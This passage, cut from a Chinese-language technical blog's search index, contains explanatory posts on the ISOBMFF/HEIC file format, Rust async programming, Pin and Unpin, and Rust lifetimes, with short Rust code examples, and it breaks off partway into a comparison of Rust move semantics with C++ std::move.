Box 一样，例如 size 为 1 时也表示该 Box 是一个扩展尺寸的 Box。\n扩展尺寸 Full Box 的结构示意：\nbytes description example 4 box_size == 1 4 box_type “ftyp”, “meta” 8 extended_size 1 version 3 flags extended_size - 20 box_data 在 HEIC/HEIF 文件中查找 Exif 信息 本节介绍一下在 HEIC/HEIF 中定位 Exif 信息的过程，算是对上述知识点的一个综合应用吧。\n先看一下一个典型的 HEIC/HEIF 文件的结构示意图：\n由于 Box 的嵌套特性，每个顶层 Box 都可以视为一棵 Box 树。因此，我们可以采用类似文件路径的方式，来标识某个 Box, 路径名即为 Box type。例如，在上图中，我们可以用 /meta/iinf 表示顶层 Box meta 下面的 iinf Box。\n有了上述背景信息，我们可以按照下面这个步骤来查找 Exif 信息：\n查找 Exif infe\ninfe Box 的路径是 /meta/iinf/infe, 但 infe Box 不止一个， iinf 下面挂着一系列的 infe, 我们需要找的是 Exif infe, 因此需要对 infe list 进行遍历查找。\ninfe 的解析过程有点复杂，这里不展开讨论，这里只提两个字段，一个是 item_id, 另一个是 item_type 。我们在遍历 infe list 时, 需要找到 item_type == \"Exif\" 的 infe, 然后记录其 item_id 。\n解析 Exif 的偏移和长度信息\n得到 Exif infe 的 item_id 之后，可以根据该信息在 iloc Box 中获取到 Exif 的偏移和长度信息。其过程如下：\n找到 /meta/iloc Box。 iloc 的 data 部分包含一系列的 ItemLocation, 需要根据 item_id 找到 Exif 所对应的 ItemLocation 。 解析 Exif ItemLocation, 从中提取出 Exif 偏移和长度信息。 根据 Exif 偏移和长度信息，获取 Exif 数据\n当然，上述步骤是一个简化描述，实际情况会复杂很多，其中不少 Box 都涉及 version/flags 的复杂的行为控制，以及嵌套数据结构的处理，更多细节可参考 nom-exif 的源码实现。\n参考资料 ISO base media file format - Wikipedia QuickTime File Format GitHub - mindeng/nom-exif mp4box.js - file inspection 这里其实有一个特例，从 iOS 实况图片中导出的 .mov 视频文件，第一个 Box 不是 ftyp, 需要稍微注意一下。 ↩︎\n","description":"\n","tags":["parser","multimedia","rust"],"title":"\n理解 ISO 基本媒体文件格式 (ISOBMFF)","uri":"/posts/understanding-isobmff/"},{"categories":null,"content":"Rust 的异步特性很强大，相对也比较复杂。\n为了更好的理解 Rust 的异步特性，本文分别从 Rust 异步的特点、与多线程的对比、异步的用法介绍及注意事项、内部实现机制、和其他语言的横向对比等多个方面进行阐述。\nRust 异步的特点 Future 是惰性的 (inert) Future 只有在轮询 (poll) 时才会取得进展 如果 Future 被 drop 了，则不会再取得更多进展 Async 是零成本的 (zero-cost) 无需堆内存分配 无需动态分派（dynamic dispatch） 关于这一点，可以参考Rust 的异步中的进一步解释。\n不提供内置运行时 运行时由社区维护的 crates 提供。具体来说，Rust 的异步编程环境由以下几部分组成：\n标准库 提供最基本的异步相关的 traits, 类型和函数。例如 Future trait 就是标准库提供的。 编译器 async/await 语法由 Rust 编译器直接提供支持。 futures crate 提供通用工具类型、宏和函数，它们可以在任何 async 程序中使用。这些东西将来可能会成为标准库的一部分。 事实上 futures crate 自带了一个 executor 可以用来执行简单的异步任务，但是不包括 async I/O 以及 timer 的支持，可以看成是一个不完整的运行时环境，因此一般需要搭配其他运行时来使用。\n运行时 异步代码的执行，IO 和任务生成 (task spawning) 由 async 运行时提供，例如 Tokio 和 async-std。大部分异步程序以及一些异步 crates 会依赖于特定的运行时。关于这部分的更多信息可参考：The Async Ecosystem 。 单线程、多线程两种运行时可供选择 以 Tokio 为例， rt 和 rt-multi-thread 两个 feature flag 分别代表了单线程运行时和多线程运行时。\n缺失部分语言功能 一些同步 Rust 的语言功能在 async 中可能不可用，例如， 不能在 trait 中定义 async 函数 （该功能已经在 1.75 版本中支持) 。\n与多线程的对比 线程适用于少量任务场景 缺点 线程会带来 CPU 和内存开销 创建和切换线程的成本很高，即使是空线程也会消耗系统资源 使用线程池有一定缓解作用，但无法全部消除 优点 由于不需要特殊的编程模型，因此在复用现有的同步代码时，无需太大的改造成本。 有些 OS 可以修改线程的优先级，在一些延迟敏感的应用中很有用（例如驱动程序）。 Async 可显著降低 CPU 和内存开销 优点 Async 可显著降低 CPU 和内存开销，尤其是对于 IO 密集型的任务来说，例如服务器和数据库应用。 同等条件下，Async 可以比线程拥有多出几个数量级的任务。 缺点 会产生更大的二进制文件。\n原因如下：\nasync 函数的执行过程是通过状态机来管理的，因此编译器会自动为每个 async 函数生成状态机代码。 每个二进制文件都会捆绑一个 async 运行时。 开发过程可能会遇到更多问题。\n主要有以下几点：\n可能会碰到更多的编译错误: 由于涉及更复杂的语言功能，例如 lifetimes 和 pinning, 可能更容易碰到这类错误。\n运行时的错误堆栈会更复杂: 因为涉及编译器为 async 函数生成的状态机。\n一些新的错误模式: - 在异步上下文中调用一个阻塞函数\n没有正确实现 Future trait 这些错误可以悄悄地通过编译器，有时甚至可以通过单元测试。\n用法介绍 以下示例参考自 async/.await Primer 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 // `block_on` blocks the current thread until the provided future has run to // completion. Other executors provide more complex behavior, like scheduling // multiple futures onto the same thread. use futures::executor::block_on; #[derive(Debug)] struct Song { name: String, } async fn learn_song() -\u003e Song { println!(\"learn song...\"); Song {name: \"hello\".to_string()} } async fn sing_song(song: Song) { println!(\"sing song: {:?}\", song); } async fn dance() { println!(\"dance ...\"); } async fn learn_and_sing() { // Wait until the song has been learned before singing it. // We use `.await` here rather than `block_on` to prevent blocking the // thread, which makes it possible to `dance` at the same time. let song = learn_song().await; sing_song(song).await; } async fn async_main() { let f1 = learn_and_sing(); let f2 = dance(); // `join!` is like `.await` but can wait for multiple futures concurrently. // If we're temporarily blocked in the `learn_and_sing` future, the `dance` // future will take over the current thread. If `dance` becomes blocked, // `learn_and_sing` can take back over. If both futures are blocked, then // `async_main` is blocked and will yield to the executor. futures::join!(f1, f2); } fn main() { block_on(async_main()); } 1 2 3 learn song... sing song: Song { name: \"hello\" } dance ... 下面是对该示例的几点说明：\nlearn_song 在 sing_song 之前，二者是顺序执行的。 dance 和 learn_and_sing 是并发执行的。 .await 调用会导致 async 函数在当前 Future 上等待直到完成，但是会在当前 Future 阻塞时，出让当前线程的控制权并允许其他 async 函数继续执行。 使用异步时的注意事项（容易踩的坑） async 的生命周期 async fn 如果有 references 作为入参，则返回的 Future 会受到该引用的生命周期的约束。也就是说，返回的 future 必须在入参还有效时执行完 .await 。\n1 2 3 4 5 6 7 8 use std::future::Future; // This function: async fn foo(x: \u0026u8) -\u003e u8 { *x } // Is equivalent to this function: fn foo_expanded\u003c'a\u003e(x: \u0026'a u8) -\u003e impl Future\u003cOutput = u8\u003e + 'a { async move { *x } } 在下面的例子中，通过将参数和对异步函数的调用打包到一个 async 块中，来解决 references-as-arguments 的生命周期问题。这种方式实际上将 borrow_x 返回的带生命周期约束的 future 转变成了一个 'static future。\n1 2 3 4 5 6 7 8 9 10 11 fn bad() -\u003e impl Future\u003cOutput = u8\u003e { let x = 5; borrow_x(\u0026x) // ERROR: `x` does not live long enough } fn good() -\u003e impl Future\u003cOutput = u8\u003e { async { let x = 5; borrow_x(\u0026x).await } } async move async 块默认是以引用的方式捕获外部值的 async move 以 move 的方式捕获外部值，好处是生命周期可以超出该变量原来的作用域。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 /// `async` block: /// /// Multiple different `async` blocks can access the same local variable /// so long as they're executed within the variable's scope async fn blocks() { let my_string = \"foo\".to_string(); let future_one = async { // ... println!(\"{my_string}\"); }; let future_two = async { // ... println!(\"{my_string}\"); }; // Run both futures to completion, printing \"foo\" twice: let ((), ()) = futures::join!(future_one, future_two); } /// `async move` block: /// /// Only one `async move` block can access the same captured variable, since /// captures are moved into the `Future` generated by the `async move` block. /// However, this allows the `Future` to outlive the original scope of the /// variable: fn move_block() -\u003e impl Future\u003cOutput = ()\u003e { let my_string = \"foo\".to_string(); async move { // ... println!(\"{my_string}\"); } } Future 的跨线程移动 当使用多线程执行器时， Future 可能会跨线程移动 (move), 这种移动发生在 .await 调用时。因此，当变量的作用域涉及跨 .await 调用时：\n该变量类型要求实现 Send trait 如果涉及引用，则要求实现 Sync trait Future 和 Pin 关于 Pin 的解释以及使用场景，可以参考我之前发布的 Rust 中的 Pin, Unpin 和 !Unpin 一文。\n传统互斥体的局限性 由于 Future 潜在的跨线程移动特性，在使用 Mutex 时也需要注意，不能在跨 .await 调用中持有传统的 non-futures-aware 锁，因为这样做可能会导致死锁的发生。\n死锁案例分析（其中 task 的概念在后文中有解释）：\n假设 task A 和 task B 共享同一把锁 L task A 先拿到锁 L task A 中执行了 .await, 并将当前线程让度给 task B task B 执行获取锁 L 的操作。由于此时 L 已经被 task A 所持有，且 task A 已经挂起没有机会再释放锁 L, 因此 task B 永远拿不到该锁，从而导致死锁发生。 Task B 要想顺利拿到该锁，应该要具备两个条件：\ntask A 和 task B 在同一个线程内调度执行 L 是一把可重入锁 (reentrant lock) 因此，这种情况下应该使用 futures::lock::Mutex (如果使用的是 tokio 运行时，则可以使用 tokio::sync::Mutex), 而不是 std::sync::Mutex 。\n更多细节请参考：\nasync/await Shared state | Tokio 内部实现分析：Task, Executor 和 Spawner 要进一步理解 Rust 异步编程，Task, Executor 和 Spawner 这几个概念不可避免。下面对这些概念进行逐一解释。\nTask Task 是对一个或多个 Future 的封装，代表了一个可以被 Executor 执行的独立的异步工作单元。 一个 Task 通常会包含一个顶层 Future，这个 Future 可能会依赖其他更多的 Future。 Task 在被创建后会被提交给 Executor，由 Executor 负责调度和执行。 Executor Executor 是一个负责调度和执行 Task 的组件。 它会不断轮询已经提交给它的 Task，通过调用 Task 内部 Future 的 poll 方法来驱动这些 Future 向完成状态前进。 Executor 可以是单线程的，也可以是多线程的，以支持不同的并发需求。 Spawner Spawner 是一个用于创建和提交 Task 到 Executor 的组件。 在一些异步运行时（如 tokio 或 async-std）中，Spawner 通常是与 Executor 紧密绑定的，提供了方便的接口来启动新的 Task。 在 Build an Executor 这个示例中，Spawner 内部持有一个 channel 的 Sender, 而 Executor 则持有该 channel 对应的 Receiver, 用于接收 Spawner 发送过来的 task。 Executor 会在一个循环中持续接收 task 并执行 poll 逻辑。 对 Build an Executor 示例的几点理解 Future 先被 Box 装箱, 然后存在 Task 中 Task 被包装在 Arc 中，以便跨线程共享所有权 Task 中除了 Future, 还包含一个 task_sender task_sender 是 channel 的 Sender 的克隆 该 sender 用来在被唤醒时，重新将该 Task 发送到 channel 队列中，以便 executor 重新调度执行该 Task。 Executor 中包含一个 channel 的 Receiver, 不断接收 task, 取出 Future 并执行 poll。 poll 有一个 context 参数，是 Executor 创建的，context 中包含了 waker。 waker 底层其实就是 task 的引用，只是以 Waker 接口的形式存在。当任务阻塞时会注册到某个触发器当中（例如 timer, 或者 epoll 事件等）。 事件触发时，意味着任务可以继续执行。此时会调用 waker.wake() 方法，该方法会调到 Task 自身实现的 ArcWake trait 中的 wake_by_ref 方法，这里面就会调用 task_sender.send() 将 task 的克隆重新发送到 channel 中。 和其他语言的横向对比 Rust 的异步和其他语言相比，最显著的特点就是 Future 的惰性。\n下面分别对 Rust, Kotlin, Dart 和 Go 这几种语言的异步特性进行一个简单的概括性介绍，希望通过这种对比来加深对 Rust 异步特性的理解。\nRust 的异步 懒执行（Lazy Execution） 在 Rust 中，当你定义一个 async 函数时，调用这个函数实际上并不会立即执行它的代码。相反，它返回一个未执行的 future。这个 future 必须被显式地轮询（poll），通常是在一个异步上下文中调用 .await ，或者使用某种执行器（executor）来驱动。 零成本抽象（Zero-Cost Abstractions） Rust 的异步实现旨在尽可能减少运行时开销。它通过状态机的转换来实现异步操作，并不直接依赖于线程或其他重量级的并发机制。 Rust 通过在编译时将 async 函数转换成状态机来实现异步函数的运行、挂起和恢复。这种方法允许精细控制异步操作的执行，同时与 Rust 的零成本抽象原则相符。\n明确的所有权和借用 由于 Rust 的所有权和借用规则，异步代码在编译时就能最大限度的避免数据竞争和并发相关的安全性问题。 Kotlin 的异步 协程（Coroutines） Kotlin 使用协程来处理异步操作，这是一种轻量级的线程。Kotlin 的协程是立即执行的。 Kotlin 中的协程也是通过编译时转换来实现的。当你在 Kotlin 中使用协程时，编译器会将协程代码转换为状态机（参考 Kotlin language specification）。这种转换类似于 Rust 的处理方式，但在细节上有所不同，最大的区别是 Kotlin 的协程是基于 JVM 的，因此它们必须在 JVM 的限制和特性（如垃圾收集、JVM 线程模型等）下工作。\n结构化并发（Structured Concurrency） Kotlin 强调在协程中使用结构化并发，这有助于防止常见的并发相关错误。 上下文感知 Kotlin 协程可以很容易地切换上下文，例如从后台线程切换到主线程。 结构化并发 在 Kotlin 中，当你启动一个协程，它总是与一个特定的作用域（协程作用域）相关联。这个作用域负责管理协程的生命周期，包括启动和取消。结构化并发的关键点在于：\n作用域绑定 每个协程都运行在一个明确的作用域内，这个作用域定义了协程的生命周期。协程只在这个作用域内活动，一旦作用域结束，所有在这个作用域中启动的协程也会被自动取消。 父子关系 在结构化并发中，父协程会等待其所有子协程完成。如果父协程被取消，所有的子协程也会被取消。 异常传播 在子协程中发生的异常会被传播到父协程中，这使得异常处理更加一致和可预测。 Dart 的异步 事件循环（Event Loop） Dart 使用单线程事件循环模型，所有的异步操作都是围绕这个事件循环来调度的。 Future 和 Stream Dart 中的异步模式主要是通过 Future 和 Stream 实现的。 Go 的异步 协程（Goroutines） Go 使用 Goroutines 来处理并发，这是一种非常轻量级的线程。Goroutines 在创建时就开始执行。 通道（Channels） Go 使用 chan 来在 Goroutines 之间进行通信，这是一种非常强大的并发模型。 简单直接 Go 的并发模型非常简单直接，易于理解和使用。 参考资料 Asynchronous Programming in Rust futures - Rust Tokio - An asynchronous Rust runtime Kotlin language specification Asynchronous Programming in Dart Rust 中的 Pin, Unpin 和 !Unpin ","description":"\n","tags":["rust","async"],"title":"\n理解 Rust 异步编程","uri":"/posts/understanding-async-rust/"},{"categories":null,"content":"为什么需要 Pin? 引入 Pin 的目的主要是为了支持 自引用类型 (self-referential types) 。下面我们以 Future 为例，解释一下自引用类型以及引入 Pin 的必要性。\n由于异步块/异步函数中可能包含对局部变量的引用，例如下面的代码：\n1 2 3 4 5 6 async { let mut x = [0; 128]; let read_into_buf_fut = read_into_buf(\u0026mut x); read_into_buf_fut.await; println!(\"{:?}\", x); } 这类代码在生成 Future 结构时，就会出现 自引用类型 (self-referential types) 。例如，上面的代码可能生成类似下面的 Future 结构：\n1 2 3 4 5 6 7 8 struct ReadIntoBuf\u003c'a\u003e { buf: \u0026'a mut [u8], // points to `x` below } struct AsyncFuture { x: [u8; 128], read_into_buf_fut: ReadIntoBuf\u003c'what_lifetime?\u003e, } 这类结构如果不能保证 self 地址的稳定性，则会出现严重的安全隐患。例如，如果 AsyncFuture 发生了移动，则 x 的地址也会发生变化，从而导致 ReadIntoBuf 中存储的 buf 指针失效。\n要防止该问题，我们需要引入 Pin 来确保 self 地址的稳定性，以便在 async 块中安全地创建引用。\n更多细节可参考 Pinning - Asynchronous Programming in Rust。\nPin 是什么？ Pin\u003cP\u003e 是一个 struct, 可用于包装任意的指针类型 P, 而 Unpin 和 !Unpin 都是 trait 。\nPin\u003cP\u003e 是一个智能指针，可保证其包装的指针 P 后面的值不会发生移动（即物理地址保持稳定且有效），前提是其目标类型没有实现 Unpin 。\n例如， Pin\u003c\u0026mut T\u003e, Pin\u003c\u0026T\u003e, Pin\u003cBox\u003cT\u003e\u003e 都能保证 T 不会发生移动，如果 T: !Unpin 。\n大多数类型在移动时都没啥问题，这些类型实现了一个叫 Unpin 的 trait。\n对于这些类型来讲，Pin 前和 Pin 后在使用上基本一样，不受影响。例如 Pin\u003c\u0026mut u8\u003e 的行为和 \u0026mut u8 没啥区别。\n由于标准库为 Unpin 提供了 DerefMut 的一揽子实现，因此，如果 T 实现了 Unpin trait, 则可以通过 Deref Coercion 自动获得 Pin 对象的可变引用 \u0026mut T, 也可以通过 Pin::get_mut 方法手动获取 \u0026mut T, 这意味着可以安全地对 T 进行修改。\n详情可参考 Pin 的不可移动性是通过编译器来保证的 。\n如果 T 带有 !Unpin marker，一旦被 pin 则 T 不可移动。\nFuture 就是一个 !Unpin 的例子。 大多数类型默认实现了 Unpin, 如果要强制实现 !Unpin, 可以在结构体中添加一个 PhantomPinned 字段。参考 !Unpin 和 Pin\u003cBox\u003cT\u003e\u003e 示例 。 在 T: !Unpin 的前提下，保证 T 不会发生移动意味着 T 的物理地址是稳定且有效的，我们可以始终依赖该地址。\n这点主要通过限制对 T 的修改来解决。因为对于 T: !Unpin 来说，我们拿不到 Pin 所指向的 T 的可变引用。详情可参考 Pin 的不可移动性是通过编译器来保证的 。\n🌟 对 Pin::set 方法的理解。\nPin::set 方法可以设置一个新的 T 值以替换旧值。请注意，这种替换永远是一个完整的、合法的 T 值替换另一个 T 值，这点和直接获取 mut 引用有所不同，因为直接获取 mut 引用可能会导致不安全的修改（例如对自引用类型的 swap 操作）。同时， set 方法会引起旧的值的析构，因此是安全的，没有违反 Pin 协议。\nPin 可以发生在栈上，也可以发生在堆上。\n栈上的 Pin 依赖于 unsafe 代码，且需要由 我们自己提供被 Pin 值的生命周期的保证，否则可能违反 Pin 契约。（更新：Rust 1.68 引入了 安全版本的栈上 pin 宏 std::pin::pin!() ）。参考 !Unpin 和 Pin\u003cBox\u003cT\u003e\u003e 示例 。\n堆上的 Pin 直接用 Box::pin() 即可。参考 Unpin 和 Pin\u003cBox\u003cT\u003e\u003e 示例 。\nPin 的不可移动性是通过编译器来保证的 Pin\u003cP\u003e 仅为 Target 为 Unpin 的可变引用实现了 DerefMut, 其他情况都只能获得 Target 的不可变引用。\n参考标准库中的 Pin 实现：\n1 2 3 4 5 6 7 8 9 10 11 12 13 impl\u003cP: Deref\u003e Deref for Pin\u003cP\u003e { type Target = P::Target; fn deref(\u0026self) -\u003e \u0026P::Target { Pin::get_ref(Pin::as_ref(self)) } } // 为 Target 为 Unpin 的可变引用提供的 DerefMut 实现 impl\u003cP: DerefMut\u003cTarget: Unpin\u003e\u003e DerefMut for Pin\u003cP\u003e { fn deref_mut(\u0026mut self) -\u003e \u0026mut P::Target { Pin::get_mut(Pin::as_mut(self)) } } Pin 的使用场景示例 需要通过 Future 的 \u0026mut _ 引用调用 .await 方法时 async fn 返回的 Future 是 !Unpin 的 Future 在被 poll 之前，必须被 pin 住 直接在 Future 上调用 .await 会自动处理 pin 的逻辑，但是会将该 Future 消耗掉 要想不消耗掉 Future (例如在 loop 里面对 Future 进行 select!), 需要通过 mut 引用来调用 .await 方法。 通过 mut 引用 .await 前，需要我们自己手动先将 Future pin 住。 Pin 有两种方式： 在堆上 pin: 使用 Box::pin 将数据分配到堆上并 pin 住。 在栈上 pin: 使用 tokio::pin! (或者 std::pin::pin!) 宏，将数据 pin 在栈上。 参考 tokio::pin。\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 use tokio::pin; async fn my_async_fn() { // async logic here } #[tokio::main] async fn main() { let future = my_async_fn(); // 去掉下面这句，将导致编译失败‼️ pin!(future); (\u0026mut future).await; // 或者用标准库的 local pin 方法： // std::pin::pin!(future).await; } 对 stream! / try_stream! 宏生成的 Stream 进行迭代时 和 Future 类似，由于 stream! / try_stream! 生成的 Stream 同样是 !Unpin 的，因此，在对其进行迭代操作前，同样需要先 pin 住。\n详细信息可参考 Streams in Tokio。\n!Unpin 和 Pin\u003cBox\u003cT\u003e\u003e 示例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 use std::marker::PhantomPinned; use std::pin::Pin; #[derive(Debug)] struct Test { a: String, b: *const String, // 表明该类型未实现 Unpin, 去掉该字段则默认实现了 Unpin _marker: PhantomPinned, } impl Test { fn new(txt: \u0026str) -\u003e Pin\u003cBox\u003cSelf\u003e\u003e { let t = Test { a: String::from(txt), b: std::ptr::null(), _marker: PhantomPinned, }; let mut boxed = Box::pin(t); let self_ptr: *const String = \u0026boxed.a; unsafe { boxed.as_mut().get_unchecked_mut().b = self_ptr }; boxed } fn a(self: Pin\u003c\u0026Self\u003e) -\u003e \u0026str { \u0026self.get_ref().a } fn b(self: Pin\u003c\u0026Self\u003e) -\u003e \u0026String { unsafe { \u0026*(self.b) } } } pub fn main() { let mut test1 = Test::new(\"test1\"); let test2 = Test::new(\"test2\"); println!(\"a: {}, b: {}\", test1.as_ref().a(), test1.as_ref().b()); println!(\"a: {}, b: {}\", test2.as_ref().a(), test2.as_ref().b()); // 下面这行编译报错❗ //  cannot borrow data in dereference of `Pin\u003cBox\u003cTest\u003e\u003e` as mutable rustc (E0596) // trait `DerefMut` is required to modify through a dereference, // but it is not implemented for `Pin\u003cBox\u003cTest\u003e\u003e` // test1.a.push_str(\"hello\"); } 1 2 a: test1, b: test1 a: test2, b: test2 Unpin 和 Pin\u003cBox\u003cT\u003e\u003e 示例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 use std::pin::Pin; #[derive(Debug)] struct Example { value: i32, } impl Example { fn increment(\u0026mut self) { self.value += 1; } } // Example 类型自动实现了 Unpin。 fn main() { let mut example = Example { value: 10 }; let mut pinned_example = Pin::new(\u0026mut example); // 由于 Example 实现了 Unpin，我们可以获取可变引用来修改它 pinned_example.as_mut().increment(); println!(\"Updated value: {}\", pinned_example.value); } 1 Updated value: 11 ","description":"\n","tags":["rust","async"],"title":"\nRust 中的 Pin, Unpin 和 !Unpin","uri":"/posts/pin-unpin-in-rust/"},{"categories":null,"content":"Lifetime 的主要目的是防止悬空引用 (dangling references) 下面的例子中， borrow checker 会检查 r 的生命周期 'a 比其引用的数据的生命周期 'b 要长，因此会拒绝编译通过。\n1 2 3 4 5 6 7 8 9 10 11 // ❌ borrowed value does not live long enough fn main() { let r; // ---------+-- 'a // | { // | let x = 5; // -+-- 'b | r = \u0026x; // | | } // -+ | // | println!(\"r: {}\", r); // | } // ---------+ Lifetime 是一种特殊的泛型参数 具体到形式层面，Lifetime 实际上是一种特殊的泛型参数，这些泛型参数为编译器提供了有关引用之间如何相互联系的信息。\n参考 common-rust-lifetime-misconceptions 一文中的定义，可以加深对 Lifetime 的理解：\n🌟 变量的生命周期是指它所指向的数据可以被编译器静态验证在其当前内存地址上有效的时间长度。\nA variable’s lifetime is how long the data it points to can be statically verified by the compiler to be valid at its current memory address.\n在函数中使用 Lifetime 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 fn longest\u003c'a\u003e(x: \u0026'a str, y: \u0026'a str) -\u003e \u0026'a str { if x.len() \u003e y.len() { x } else { y } } fn main() { let string1 = String::from(\"long string is long\"); { let string2 = String::from(\"xyz\"); let result = longest(string1.as_str(), string2.as_str()); println!(\"The longest string is: {}\", result); } } 1 The longest string is: long string is long 上例中，由于 borrow checker 无法推断出 x、y 的生命周期和返回值的生命周期之间的关系，因此必须通过生命周期参数来指定。该例中，返回值的生命周期和两个变量中生命周期较短的那个保持一致。\n生命周期注解并不影响引用的生存时间，而是用于描述多个引用的生命周期之间的关系（主要是描述返回值和入参的生命周期之间的关系）。 在结构体中使用 Lifetime 1 2 3 4 5 6 7 8 9 10 11 struct ImportantExcerpt\u003c'a\u003e { part: \u0026'a str, } fn main() { let novel = String::from(\"Call me Ishmael. Some years ago...\"); let first_sentence = novel.split('.').next().expect(\"Could not find a '.'\"); let i = ImportantExcerpt { part: first_sentence, }; } 上例中， ImportantExcerpt 实例的生命周期不能超出其 part 字段的生命周期。\nLifetime 参数的省略规则 (Lifetime elision rules) 对于一个函数来说：\n编译器为每个引用参数分配一个生命周期参数。 如果只有一个输入生命周期参数，则将该生命周期分配给所有的输出生命周期参数。 如果有多个输入生命周期参数，且其中一个是 \u0026self 或 \u0026mut self (即这是一个方法)，则将 self 的生命周期分配给所有的输出生命周期参数。 当引用没有显式生命周期注解时，编译器按照上述规则来计算引用的生命周期。如果上述三条规则走到底，仍然存在无法计算出生命周期的引用时，编译器会停止并报错。\n理解 \u0026'static T 引用 请注意 \u0026'static T 和 T: ‘static 二者之间的区别。\n\u0026'static T 可以通过以下两种方式产生：\n对静态变量的引用\n例如，字符串字面量因为存储在二进制文件中，在程序运行期间都有效，因此具有 'static 生命周期。例如：\n1 2 3 fn main() { let str_literal: \u0026'static str = \"字符串字面量\"; } 通过 Box::leak 方法在运行时生成一个 \u0026'static T, 下面将展开论述。\n通过 Box::leak 生成 \u0026'static T 引用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 #[derive(Debug)] struct A { s: String, } impl Drop for A { fn drop(\u0026mut self) { println!(\"{:?} has been dropped!\", self); } } fn leak_a() -\u003e \u0026'static A { let a = A { s: \"hello\".to_string(), }; Box::leak(a.into()) } fn main() { let a: \u0026'static A = leak_a(); println!(\"a = {:?}\", a); // recover `a` Box from the leaked reference let a = unsafe { let const_ptr = a as *const A; let mut_ptr = const_ptr as *mut A; Box::from_raw(mut_ptr) }; println!(\"a = {:?}\", a); // `a` will be dropped here } 1 2 3 a = A { s: \"hello\" } a = A { s: \"hello\" } A { s: \"hello\" } has been dropped! 上面这个例子有两个要点：\n通过 Box::leak 生成 \u0026'static T 引用 通过 Box::from_raw 将引用恢复为一个 Box 对象（需结合 unsafe 代码） 关于这个主题的进一步的讨论，可以参考我给 rust-blog 提的一个 PR。\n在泛型中使用 Lifetime 理解 T: 'static 请注意和 \u0026‘static T 引用 之间的区别。\n下面的读法有助于正确理解 T: 'static:\n🌟 T: 'static 应读作： T 受到 'static 类型生命周期的约束。\nT: 'static:\n包括所有的 \u0026'static T 也包括所有的 owned types, 因为 owner 可以确保数据一直有效。因此 T: 'static ： 可以在运行时动态分配 不需要在整个程序生命周期内有效 可以安全、自由地修改 可以在运行时被释放 可以有不同持续时间的生命周期 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 fn drop_static\u003cT: 'static\u003e(t: T) { std::mem::drop(t); } fn main() { let mut strings: Vec\u003cString\u003e = Vec::new(); for i in 0..10 { strings.push(i.to_string()); } // strings are owned types so they're bounded by 'static for mut string in strings { // all the strings are mutable string.push_str(\"a mutation\"); // all the strings are droppable drop_static(string); // ✅ } } 理解 \u0026'a T 和 T: 'a \u0026'a T 隐含了 T: 'a\n如果一个 T 的引用在 'a 内有效，那么 T 在这个周期内也必须有效，否则前者不成立。\nT:'a 比 \u0026'a T 更加通用和灵活\n前者可以接受 owned types (指非引用类型) 和引用\n后者只能接受引用\n如果 T: 'static, 那么 T: 'a, 因为：\n前者读作：T 满足静态生命周期约束\n后者读作：T 满足 'a 生命周期约束\n静态生命周期 \u003e= 'a 生命周期，因此上述结论成立\n案例（参考自common-rust-lifetime-misconceptions)：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // only takes ref types bounded by 'a fn t_ref\u003c'a, T: 'a\u003e(t: \u0026'a T) {} // takes any types bounded by 'a fn t_bound\u003c'a, T: 'a\u003e(t: T) {} // owned type which contains a reference struct Ref\u003c'a, T: 'a\u003e(\u0026'a T); fn main() { let string = String::from(\"string\"); t_bound(\u0026string); // ✅ t_bound(Ref(\u0026string)); // ✅ t_bound(\u0026Ref(\u0026string)); // ✅ t_ref(\u0026string); // ✅ t_ref(Ref(\u0026string)); // ❌ - expected ref, found struct t_ref(\u0026Ref(\u0026string)); // ✅ // string var is bounded by 'static which is bounded by 'a t_bound(string); // ✅ } ","description":"\n","tags":["rust"],"title":"\n理解 Rust 的生命周期 (Lifetime)","uri":"/posts/understanding-lifetimes-in-rust/"},{"categories":null,"content":"Rust 的 move 和 C++ 的 std::move 在表面上看有些相似之处，因为它们都涉及到数据或资源的转移。然而，它们在设计理念、实现方式以及它们在各自语言中所扮演的角色上有着根本的区别。\nRust 中的 Move 语义 所有权转移 Rust 中的 move 语义是其所有权系统的核心部分。当一个值从一个变量移动到另一个变量时，原始变量不再有权访问该值。这避免了悬垂指针和数据竞争等问题。 编译时检查 Rust 的编译器在编译时就会检查所有权、借用和生命周期规则，确保内存安全而无需运行时开销。 自动控制 Rust 的 move 语义是通过编译器自动实现的，不需要程序员提供特殊的代码来支持 move 语义。 C++ 中的 Move 语义 资源转移 C++11 引入了 move 语义，主要用于优化资源管理，减少不必要的对象复制。通过 std::move ，可以将一个对象的状态或资源转移到另一个对象，原对象则处于一个有效但未定义的状态。 标准库的支持 C++ 的 move 语义与其标准库紧密结合，许多容器和算法都对 move 语义进行了优化。 手动控制 与 Rust 的自动和严格的所有权模型不同，C++ 程序员需要更多地手动管理资源和使用 move 语义，这提供了灵活性但也增加了错误的可能性。 具体来讲，C++ 的 move 语义是通过类的『移动构造函数』和『移动赋值运算符』来提供支持的。\n异同点分析 设计理念 Rust 的 move 语义设计主要是为了实现内存安全和线程安全，而 C++ 的 move 语义更多是为了性能优化和资源管理。 实现机制 Rust 在编译时强制执行所有权规则，几乎不允许违反这些规则的代码通过编译。而 C++ 给了程序员更多的控制权，但这也意味着更高的出错风险。 使用场景 Rust 的 move 用于所有权转移，强调安全和清晰的所有权模型。C++ 的 move 更多是用于性能优化，尤其是在处理大型对象或资源密集型对象时。 深入到内存层面 如果我们深入到内存层面，就会发现，Rust 的 move 和 C++ 的 move 又有一些相似之处。\n就内存操作而言，Rust 中的 move 过程本质上是对数据结构的浅拷贝1（即按字节拷贝）。以 Vec\u003cT\u003e 为例，move 操作涉及到的只是对数据结构内部字段（指针、长度和容量等）的拷贝，而不会触及堆上的数据本身。这点和 C++ 